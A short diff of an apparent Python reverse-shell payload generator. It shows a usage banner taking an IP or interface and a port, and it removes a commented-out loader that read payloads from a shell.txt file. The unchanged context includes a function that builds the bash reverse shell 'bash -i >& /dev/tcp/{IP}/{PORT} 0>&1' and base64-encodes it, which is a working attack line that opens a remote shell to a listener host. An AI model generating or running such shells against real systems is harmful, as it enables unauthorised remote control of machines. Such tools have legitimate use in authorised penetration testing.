@@ -49,13 +49,6 @@ def header():
 \n{colors.CYAN}-------- [{colors.RESET} USAGE {colors.CYAN}] --------
 {colors.RESET}{colors.ORANGE}\npython3 {sys.argv[0].split("/")[-1]} 10.10.10.10 9001 py\n{colors.ORANGE}python3 {sys.argv[0].split("/")[-1]} tun0 9001 py{colors.RESET}''')
 
-
-#def load_shell():
-#	listShell = open("shell.txt").read()
-#	for counter,i in enumerate(str(listShell).split("#INDEX")[1:]):
-#		for j in i.split("#EXAMPLE")[1:]:
-#			payload[list(payload.keys())[counter]].append(j)
-
 def base64gen(ip,port):
 	temp = 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'.replace("{IP}",ip).replace("{PORT}",port)
 	return base64.b64encode(temp.encode('ascii'))
